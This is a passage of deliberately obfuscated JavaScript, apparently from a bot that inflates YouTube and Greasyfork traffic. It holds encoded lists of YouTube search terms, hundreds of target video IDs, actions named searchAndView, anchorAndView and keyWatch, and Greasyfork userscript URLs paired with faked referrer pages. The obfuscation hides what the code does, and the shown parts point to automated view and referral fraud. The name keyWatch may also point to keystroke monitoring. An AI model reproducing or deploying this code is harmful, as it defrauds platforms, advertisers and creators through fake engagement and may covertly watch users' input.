searchTerms['push'](('mrbeast,mr' + '\x20beast,mrb' + 'east\x20team,' + 'mrbeast\x20cr' + 'ew,the\x20old' + '\x20mrbeast\x20c' + 'rew,mrbeas' + 't\x20ex\x20emplo' + 'yees,mrbea' + 'st\x20ex-empl' + 'oyees,mrbe' + 'ast\x20live,m' + 'rbeast\x20hin' + 'di,mr.\x20bea' + 'st,mrbeast' + '\x20studio,mr' + 'beast\x20gami' + 'ng,sunnyv2' + '\x20mrbeast,m' + 'rbeast\x20sun' + 'nyv2,mrbea' + 'st\x20in\x20hind' + 'i,who\x20is\x20m' + Z(0x17) + '\x20beast\x20hin' + 'di,mr\x20beas' + 't\x20react,wh' + 'at\x20happene' + 'd\x20to\x20mrbea' + 'st\x20ex\x20empl' + 'oyees,mr\x20b' + 'east\x20studi' + 'o,mr\x20beast' + '\x20gaming,mr' + 'beast\x20ware' + 'house,mr\x20b' + 'east\x20in\x20hi' + 'ndi,mr\x20bea' + 'st\x20podcast' + ',mister\x20be' + 'ast,mrbeas' + Z(0x4) + 'leave')['split'](',')), searchTerms['push'](('minecraft,' + 'minecraft\x20' + 'hardcore,h' + 'ardcore\x20mi' + 'necraft,mi' + 'necraft\x20ch' + 'allenge,mi' + 'necraft\x20bu' + 't,minecraf' + 't\x20mod,mine' + 'craft\x20mods' + ',minecraft' + '\x20100\x20days,' + 'minecraft\x20' + 'funny,funn' + 'y\x20minecraf' + 't,minecraf' + 't\x20video,mi' + 'necraft\x20sc' + 'hool,100\x20d' + 'ays\x20minecr' + 'aft,minecr' + 'aft\x20animat' + 'ion,w\x20mine' + 'craft,mine' + 'craft\x20comp' + 'ilation,mi' + 'necraft\x20pe' + ',monster\x20s' + 'chool\x20mine' + 'craft,mine' + 'craft\x20mons' + 'ter\x20school' + ',to\x20be\x20con' + 'tinued\x20min' + 'ecraft,min' + 'ecraft\x20izl' + 'e,minecraf' + 't\x20story,mi' + 'necraft\x20mo' + 'vie,minecr' + 'aft\x20house,' + 'minecraft\x20' + 'fakir')['split'](',')), searchTerms['push'](['moomoo.io\x20' + 'zyenith']['repeatExte' + 'nd'](-0x1 * -0x17a1 + -0x2627 + 0xe90)), searchTerms['push'](['moomoo.io\x20' + 'spyder']['repeatExte' + 'nd'](-0x1 * 0x1be6 + -0xb8e + 0x1e * 0x151)), searchTerms['push'](('bts,bts\x20v,' + 'jin\x20bts,bt' + a0(0x10, 'bezb') + '\x20army,v\x20bt' + 's,rm\x20bts,b' + 'ts\x20rm,bts\x20' + 'jin,bts\x20sa' + 'd,sad\x20bts,' + 'bts\x20日本語,bt' + 's\x20韓国語,bts\x20' + '面白い,cctv\x20b' + 'ts,suga\x20bt' + 's,army\x20bts' + ',bts\x20live,' + 'kpop\x20bts,j' + 'imin\x20bts,j' + 'hope\x20bts,b' + 'ts\x20funny,b' + 'ts\x20日本語字幕,b' + 'ts\x20update,' + 'bts\x20future' + ',bts\x20eatin' + 'g,bts\x20stre' + 'ams,bts\x20日本' + '語字幕最新,taeh' + 'yung\x20bts,j' + 'ungkook\x20bt' + 's,bts\x20reac' + 'tion,bts\x20s' + 'truggle,bt' + 's\x20marriage' + ',bts\x20jungk' + 'ook,bts\x20面白' + Z(0xb) + 's\x20playlist' + ',bts\x20play\x20' + 'game,bts\x20n' + 'ew\x20video,b' + 'ts\x20news\x20to' + 'day,bts\x20in' + 'terview')['split'](',')), searchTerms = searchTerms['flat'](-0x1 * -0x1315 + 0x5e * 0x5c + -0x8cf * 0x6);
const hookPlaylistPoints = [
    'eHpl-BjXo5' + '8',
    '-PgyODlV6V' + '8',
    'S9EkXX0QYD' + 'U',
    'WvcG1OKdHW' + 'o',
    'b6gOcEwtZ8' + 'U',
    'apdtzA0Dzf' + 'k',
    'YiukDwYv2K' + '4',
    'zK-6UH5R5X' + '8',
    'bIXqNjtsEf' + '4',
    '3l253rESkw' + 'Q',
    'u6RVZKcN9z' + 'Q',
    '6ImZdwpdwT' + 'A',
    '0qPB5ANSBK' + 'c',
    '92duH3cqn1' + 'M',
    'b5lKI78fw3' + 's',
    'zpCCPZfP8L' + 'I',
    'ES7oooakr-' + 'c',
    '2eWyJ8FBvQ' + '8',
    'O4-B3OFPDf' + 'Q',
    'JFcnGk0_u7' + 'o',
    'AP7d2Ghq6d' + 'U',
    'UizEAwrZAG' + 'I',
    '0FAi5-h8Hj' + '0',
    'CNqA6IYj17' + 'k',
    'tSiKyCpwnS' + 'Y',
    'OrglyeV5xP' + 'Y',
    'BXkB-g4eCc' + 's',
    'Y53CmmpbOJ' + 's',
    'sm5MLz_IrQ' + 'k',
    'EuciRU_Ska' + '0',
    'cCbDCTLyPc' + 'E',
    'Ox7Ng5T7bm' + 'c',
    'TXTaB-dQg-' + '0',
    '3jSWaWgr_A' + '0',
    'xT8nvuxCRB' + 'E',
    '3c4Ab9EmRg' + 'Y',
    '2kScgeNOpL' + '8',
    't22jhowMom' + 'c',
    'HbcDLgkmXL' + 's',
    'JsKZ41uTeg' + 'c',
    'dfU48FRgs0' + 'g',
    '3K9ILewnUk' + 'o',
    'QmKwnRiKhD' + 'k',
    'n3nVsWsL6I' + 'k',
    'noTs52D_Mw' + 'Y',
    'A0tDR4nTTK' + '0',
    '9eBwFca-B1' + '4',
    'moasU30H5l' + 'A',
    '_Mb8oQtSBW' + 'E',
    'TNGGOgwPtc' + 'M',
    '-pYA-gjkQ8' + 's',
    '5d-dB6tZZA' + 'o',
    '8H2AiOV0oE' + 'o',
    'mI7aiKDGde' + 'w',
    'D-IMDYrj35' + '4',
    'gKgFiEgghy' + 'g',
    'mjVwfjJ2nj' + 'k',
    '6auDBi-D2H' + 'M',
    'X89-SWNdIE' + 'k',
    'T5Pn4LhIwj' + 'M',
    'wVnKGSjY3i' + '8',
    'g11NJftxw1' + '4',
    '9zHirkfEKk' + 'k',
    'ZyGS_AMbIa' + '4',
    'yG6bwB17ZP' + 's',
    'aytHiLe0s6' + 'U',
    'cGe-Mpw_F1' + 'w',
    'eMK7xV_nxZ' + 'o',
    'epJ2MAKa1Y' + 'Q',
    '5BNbKKMUhE' + 'o',
    'oxpAvc6tDP' + '8',
    'jRcc-NIR2R' + 'I',
    '258btO4mFw' + '4',
    'pXjJAUvSbQ' + 'A',
    '63-irfPjh2' + 'c',
    'xbrDZAFf3Q' + 's',
    'MVHMtRlesU' + 'g',
    'zed05qfHMB' + 'I',
    'nkhkxKUHsY' + 'g',
    'n4cSAqR9H1' + 'Q',
    'gOUPndcj7z' + 'I',
    'n3HBTTDHoX' + '8',
    'XIgMFHPIXv' + '4',
    'oQHKMky-_K' + 'c',
    'zfDgTzZ2nh' + '0',
    '1PYettRo-D' + 'M',
    'jzuZuwF490' + '4',
    '2DAgWTlXae' + '8',
    'keouUYA5hI' + 'k',
    'F7i7wRlGCd' + 'c',
    'uToD2c0CdJ' + 'c',
    'Y8DzpdFZZ8' + '8',
    '-rrH657DAa' + 'o',
    'QTrEEWtDks' + '4',
    'TWTSnQDuad' + 'Y',
    'a0GUyvgnzg' + 'c',
    'eSReWZQyKd' + 'E',
    'D_5pMqdKSs' + '4',
    'm0ie8gHS00' + 'I',
    '6WosqMq9ej' + 'o',
    'i0afAOlon_' + '4',
    'j_fe6PfxW4' + 'Y',
    'GfPzi8SYr0' + 'w',
    'MSgZhNCwff' + 'M',
    'wxyBC_z6bI' + '8',
    'PkQpV-Fwhs' + 'k',
    'bVD6cWOVhN' + 'U',
    'mjZOpQlHbx' + 'M',
    'k_BXkcdbBO' + 'M',
    'X72oUsFV7q' + '0',
    'lONsILfq-W' + 'Y',
    'Bhe9PyM_s_' + 'Q',
    'Bhe9PyM_s_' + 'Q',
    'h4TBnDkX4y' + 'o',
    'PNBJyHEkfk' + '4',
    'L3iHS__ufc' + 'g',
    'm7aliUAwm_' + 'Y',
    'FuPVf85zMi' + 'w',
    'gtupAeNTDS' + 'M',
    'yyJ8zkckoB' + '8',
    'ZDTESiN1eS' + 'w',
    'Fo6x16DkoR' + 'o',
    'IAJqRxhVqO' + 'k',
    'KAgwII8TGj' + 'o',
    'o4tLCshmlb' + 'M',
    'dLj5fIupdA' + 'o',
    '_Xl_-b9P4U' + 'Q',
    'V3NxxpUUfW' + 'E',
    'J3ygeDEMnO' + 'w',
    'HcP_xmdwsl' + 'c',
    'M9g0h7px2_' + 'M',
    'b5WfUvcSgr' + 'U',
    'JGHnIshsoC' + 'E',
    'x2gfhCLHd9' + '4',
    'M5Fr8G0ma9' + 'o',
    '3sGeIBfFlC' + 'M',
    'k74y4KOJ2m' + '4',
    'pTHJB0S8E-' + 'U',
    'KaIrXJLfYP' + 'M',
    '0cisZkywhg' + 'Q',
    '0dVzItbl9E' + 'w',
    't0EqnhcSb1' + 's',
    'MuiXtvo1RY' + 'E',
    'Nj-3KC6knH' + 'w',
    'B19HbETNi5' + '8',
    'yKN_QkroH6' + 's',
    'U9ExFM1pji' + '0',
    'sONzDfjKhL' + '4',
    'n3Kj8zEfew' + 'U',
    'nXLGQ7QeoG' + 'Y',
    'OQFQiwiM-P' + 'Y',
    'UtPRpKRTtH' + 'U',
    'E56Myp0BzE' + 'E',
    '7DjOp_JM2Z' + 'w',
    'rNFLQFz_G1' + 'g',
    '1r2pKoVAdj' + 'M',
    'gm3eiv6UND' + 'M',
    'yOiROfjxzX' + 'o',
    'lt2AcxC_ap' + 'g',
    'bObEme2BDO' + 'E',
    '6Ut6HbJmW4' + 'w',
    'fUs0TtQQTo' + '0',
    '_phHS3FAgW' + 'Q',
    '1f8sU4l3dP' + '4',
    'HwTSLUd53K' + '8',
    'EpP2ymD_QG' + 'A',
    'TQ69QFqmbo' + 'I',
    'wA8BqUka_u' + '0',
    'bc8Ey-vuR5' + 'M',
    'PZ_uLi7ULl' + '0',
    'smu5FsnhwF' + '4',
    'dv1JluwoOb' + 'c',
    'nHotP0jbcv' + 'A',
    'iIjYNEmrVv' + 'M',
    'SeP-OZAiPb' + 'c',
    'v52PClvMFt' + 'k',
    '3loLqIPxTS' + '0',
    'jVu9mOzbSq' + 'U',
    '73SAN1vOrV' + 'k',
    'YLPxp4ntym' + 's',
    'YWXfelRk3b' + 'Q',
    'CsxlLMb6Uj' + 'o',
    'uafGOfwzpa' + 'Q',
    'XIr8qotHOI' + 'E',
    'EcoPCWC3Uh' + 'o',
    'AhOwyT8aIh' + 'g',
    't-Ox7lI5UH' + 's',
    'i08qNmssXe' + 'Q',
    'QrJIU09eD-' + 'g',
    'QvNNCQ-8Rp' + 'E',
    'k5gjnjDFAZ' + 's',
    'h_NQ3y1ek8' + 'U',
    'evPsJlNLy_' + '4',
    'qEPTydgwh4' + 's',
    'LB685ckhuf' + 'E',
    'Lj1EcSMGey' + '0',
    'OE19r7MIMW' + 'Q',
    'u8E3p0Vy-P' + 'Y',
    'f4a5OPFQa7' + 'k',
    'XDo7Q7yUEt' + 'k',
    'Vw_9zw0qHI' + 'c',
    'KGT5nbDsI_' + '8',
    'E008Eql59M' + 'Q',
    'wSOFdefX47' + 'A',
    '2xcv7q3QhR' + 'E',
    'hgfvmcBkc0' + '4',
    '0wP7csnX7k' + '4',
    'Xo0R8WiRSb' + '4',
    '8zNp8EOpGd' + '4',
    'sWYhIJZmoS' + 'E',
    'YdG8U1W-bX' + '0',
    'QeDsoSNml-' + 'c',
    'xW5q77El0x' + '8',
    'ZF14issJFE' + 'Y',
    'TRglEGLLKX' + 'o',
    'UE0SXc5k1e' + 'g',
    '6VY65D8f3D' + 'Q',
    'Iwxuob4fA8' + 'Q',
    'M4elJHCUIi' + 's',
    'GY9WWhO504' + 'k',
    'eErUSxmLDw' + '8',
    'ITQfAfzLj3' + 'I',
    'vbDrCL2FuL' + 'g',
    'KyQ_sUgtbK' + 'U',
    'lbEJcipUp8' + 'I',
    '2SqCn2LreN' + 'g',
    '1i-G2TUn41' + '0',
    's0ru6uK7vi' + '8',
    'gOxiE5UAAD' + 'w',
    'lx1rOOjekc' + '8',
    '5VYN2zA-Si' + 'k',
    'q9rLWEAzoo' + 'k',
    '4KSm3IY7Xz' + 'g',
    'fMqRu_ON-D' + 'E',
    'GfvShU6Sy9' + 'A',
    'OHzOmi1b60' + 'Y',
    'D9oTUKT-_n' + 'A',
    '_BrT2PlUiw' + '0',
    'kuuI4LzKgm' + 'I',
    '78dymyg88r' + 'M',
    'mi0nGt2B-q' + 'o',
    'HaI7BjnwnO' + 'c',
    'xlAEOkIuy7' + 'Y',
    '3VmtckvTXl' + 'U',
    'ed7TWHKDr4' + 'E',
    '2LfTjyVtbf' + 'U',
    'STHlCkloyv' + 'E',
    '-BI_-6YnM6' + 'Y',
    'LSK_G1qCQw' + 'M',
    '4tzqIl6EKV' + 'k',
    Z(0x11) + '8',
    'mBtaEI_6e8' + 's',
    '960lvuduwY' + 'w',
    'XWJH-6J5Ee' + 'g',
    'XLS4qmyCAX' + 'g',
    '8cJDYeRiLn' + 'k',
    'cCaIVrltHz' + 'w',
    '8X2fF4pgM0' + 'E',
    '6s8Xm4wylr' + '4',
    'eFceshvavn' + 'o',
    '2h4g7euqR-' + 'U',
    'ujiBqXnn92' + '8',
    'w9F2NST-9j' + 's',
    'w-oc7F5Mmy' + 'U',
    'UYrmqL3cOD' + 'U',
    '4QB59etj0I' + 'o',
    'MY9MTNgXcN' + 'o',
    'ISBmcKDS5C' + '8',
    'ogIb7A7tvW' + '0',
    '-L583IZF6s' + 'k',
    'NbeKQq29ZL' + '0',
    'SPplDxd74F' + 's',
    'MHGV8QmpAz' + 'k',
    'iWzezFWpU7' + 'A',
    'NNCQt1rXXE' + 'Y',
    'bcb_ZhJJK8' + 'g',
    '3KoZGQiY6N' + 'o',
    'aSaXQH8F1_' + 'A',
    'V5nMOhI62o' + 'w',
    'JvlPjRUdId' + '0',
    '2gQHuClLCb' + '0',
    '5e-qDy-uUJ' + 'E',
    'oE8vC0QEWU' + 'E',
    '7cQken99yu' + 'o',
    'pmzu080j7r' + 'I',
    'sVy9F4whP6' + 'o',
    'MJrkylk7iE' + 'c',
    'XYjsTxi6oE' + '8',
    'mKlMouB6tp' + '0',
    'o2yunZQley' + 'A',
    'oRryU9F9Lv' + 's',
    'uzzK-052H0' + 'c',
    'VSvA4rCe-4' + 'M',
    'XURH2u_0fM' + 'I',
    'yfpVL2g_tk' + 'o',
    'AuEEjQ8x9o' + 'w',
    'wWkviY8zBr' + 'c',
    'zt_eubHWhx' + 'c',
    'O_7_BGU3u_' + '0',
    'QFDKBxmOn3' + 'Y',
    'w6gccNWXXv' + 'g',
    'VdNJxbrqdX' + 's',
    'wbi5Dxebvn' + 'I',
    'XEFOREYrJg' + 'k',
    'I2rcRta7WJ' + '0',
    'OP5KGfXHX_' + 'A',
    'w2MUMbbwlm' + 'o',
    'X3bF0nd6kf' + 'w',
    'WDDAhASf9j' + 'w',
    'fRwcV8gjbc' + 'w',
    '7T63gaRThr' + '0',
    'zC8AWIwhbf' + 's',
    'JSkVE0n-ee' + 'o',
    'qiQA5pWWRt' + 'U',
    'QdXCjZtfXu' + 'c',
    'vlBji8TOax' + 'o',
    'pBx_5CbIcp' + 'o',
    'L1Oy5F6ZMO' + 'Q',
    'P0NjLaBed-' + 'E',
    'DR16C4-keB' + '0',
    'LGmpIpu9eD' + 'w',
    'rNkX_A4kBA' + 'Q',
    'QztVMjrEk4' + '0',
    'uOM6m6KL5d' + '4',
    'g-Aju8xrrO' + 'E',
    'DfkDbFk_x9' + '8',
    'Y4NLDaowD6' + 'I',
    'ALSZnqQTuJ' + 'o',
    'xUmB6BpZBE' + 'w',
    'SxNOcZ1s85' + '8',
    '-noeCjO416' + 'k',
    'taPJqXBI8V' + 'Y',
    'YxqbkMi1Is' + '4',
    'vnJTyve2r-' + '4',
    '44lRVYQ38E' + 'Q',
    'QOv1N1X5J-' + 'g',
    'jNjREs7ODT' + 'g',
    'U30ToJo3dd' + 'k',
    'rm7lNIIOQC' + 'Y',
    'mGU6sOPlYv' + 'c',
    '6pwxUXdt6T' + 'Q',
    '6MkJRee35a' + 'Q',
    'LVbf7U9WAI' + 'c',
    'gPbhFvEeJ3' + 'M',
    'LWXAxz0MiH' + 'A',
    'L0KQJqfwJJ' + 'Y',
    'GWr33_u0VK' + 'c',
    '4ud3ZPfWkH' + 's',
    'dxSrySC4XM' + 'c',
    'iIM2KZC69W' + '0',
    '8DuJ3BAwME' + 'o',
    'm3BAhe1wsl' + 'Y',
    '02U_3pAZxM' + '8',
    '0e7nidPa97' + 'g',
    'TixW__6Eer' + 'o',
    'q46W8MTRTC' + 'E',
    'Jdxp04Je1O' + 'w',
    'HfP4TO3gfN' + '0',
    '4dUJaeB0qL' + '8',
    'xnL-fRJ3RZ' + 'o',
    'yJbD0Df45u' + 'Q',
    '-pGw8RkSSB' + 'k',
    '7cy86Njsis' + 'M',
    'jbgqvxtauo' + '4',
    'N8M00JjSVI' + 'I',
    'MfR5q6Td3R' + 'c',
    'eHwcx94wcp' + 's',
    'olDgVFgAgP' + 'o',
    'eAAd5BmzXz' + 'M',
    'xgTjQ2sGXd' + '4',
    'ipny6JUbzw' + 's',
    'WOwQ0UxbRj' + '4',
    'h0PKFed2GB' + 's',
    'JxdOrgzq7Z' + '8',
    '-VgpSWWW-8' + 'w',
    '-ix4OizkAn' + 's',
    'd3CRE9y3YV' + 's',
    '4QZlfXxorJ' + 'o',
    'YlDpg8aCs5' + 'M',
    'Qe5WT22-AO' + '8',
    'b_rjBWmc1i' + 'Q',
    '9yjZpBq1XB' + 'E',
    'hPx-RiBKXt' + 'Q',
    'UMqLDhl8PX' + 'w',
    'DlJEt2KU33' + 'I',
    'BWeqoARup-' + 'Q',
    '2Dx76lD8Sc' + 'c',
    'j_nI6G3ZDi' + 'E',
    'zvcUYYN1sx' + 'w',
    'cWRkYo1S3L' + '4',
    'cWRkYo1S3L' + '4',
    'bxC_PN3SRv' + 'I',
    '94m93T_5JL' + 'M',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'bo9fTeXvSi' + 'A',
    'z6LqXiAK-8' + '0',
    '5tbOspjJ5f' + '0',
    'twQ6kKjtBk' + 'Y',
    'Ig17K38Fy0' + 'Y',
    'ZdlrVDwn_a' + '4',
    'aCT4Lddunx' + 'g',
    'acAvMGQtln' + 'M',
    '8XkcbdSRdO' + '0',
    '0e3GPea1Ty' + 'g',
    'zxYjTTXc-J' + '8',
    '9bqk6ZUsKy' + 'A',
    'plSyrHqUh7' + '8',
    'HkvQywg_uZ' + 'A',
    'lADBHDg-Jt' + 'A',
    'I2O7blSSzp' + 'I',
    'kd2KEHvK-q' + '8',
    'CbUjuwhQPK' + 's',
    'fb7T1v_VHp' + 'E',
    'SpeSpA3e56' + 'A',
    'RQdxHi4_Pv' + 'c',
    'nx2-4l4s4N' + 'w',
    'tUTCq3iiw_' + '4',
    'VDa5iGiPgG' + 's',
    'S-sJp1FfG7' + 'Q',
    'Hm1YFszJWb' + 'Q'
  ],
  GlobalActions = [
    searchAndView,
    anchorAndView,
    frontScreenActions,
    keyWatch
  ],
  wait = f => new Promise(h => setTimeout(h, f)),
  scriptTargets = [{
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/457024' + '-surviv-io' + '-xclient-b' + 'eta',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/surviv.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/404065' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E7%B2%BE%E' + '7%81%B5',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/51cto.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/22545-' + 'anti-bd-re' + 'direct',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/baidu' + '.com?page=' + '4'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/385' + '044-zhihu-' + 'anonymous-' + 'users',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/302' + '36-zhihu-l' + 'ink-fix',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/435948' + '-btb',
      'preRef': a1(0x5) + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430335' + '-wb-script',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430572' + '-beautify-' + 'the-baidu-' + 'homepage',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/410781' + '-diep-io-a' + 'nti-afk-ti' + 'meout',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/1196-v' + 'iew-youtub' + 'e-tags',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/21012-' + 'youtubeext',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20798-' + 'youtube-hi' + 'de-volume-' + 'control',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/9090-y' + 'outube-add' + '-video-id-' + 'text-field',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20710-' + 'calm-down-' + 'youtube',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39544-' + 'youtube-po' + 'lymer-disa' + 'ble',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/412698' + '-youtube-a' + 'uto-skip-a' + 'ds',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/413965' + '-youtube-l' + 'ike-dislik' + 'e-video-an' + 'd-skip-ad-' + 'keyboard-s' + 'hortcuts-f' + 'ork-from-n' + 'erevar009',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39919-' + 'youtube-su' + 'ggested-vi' + 'deo-hider-' + 'for-youtub' + 'e-classic',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414756' + '-requestho' + 'ok',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414876' + '-live-chat' + '-mod-calib' + 'er',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40462-' + a0(0xe, 'n)Xm') + '-resume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40517-' + 'youtube-re' + 'sume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/415706' + '-moomoo-io' + '-remove-co' + 'okie-prefe' + 'rences-tab',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405955' + '-web-secur' + 'ity',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/381682' + '-html5%E8%' + 'A7%86%E9%A' + '2%91%E6%92' + '%AD%E6%94%' + 'BE%E5%99%A' + '8%E5%A2%9E' + '%E5%BC%BA%' + 'E8%84%9A%E' + '6%9C%AC',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429635' + '-always-on' + '-focus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/30310-' + 'removeads',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/455853' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E8%AE%BF%E' + '9%97%AE%E5' + '%8A%A0%E9%' + '80%9F%E5%9' + '9%A8',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454941' + '-hcaptcha-' + 'captcha-so' + 'lver-by-no' + 'captchaai',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/discord.' + 'com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/407994' + '-mope-io-a' + 'uto-dive-a' + 'uto-boost-' + 'see-people' + '-underwate' + 'r-see-invi' + 'sible-play' + 'ers-remove' + '-ads',
      'preRef': a1(0x5) + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/mope.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424066' + '-pancake-m' + 'od-katana-' + 'musket-aut' + 'oheal-anti' + '-insta-sta' + 'rter-resou' + 'rces-and-m' + 'ore',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429746' + '-best-moom' + 'oo-io-hack' + '-mod-2022-' + '2023',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
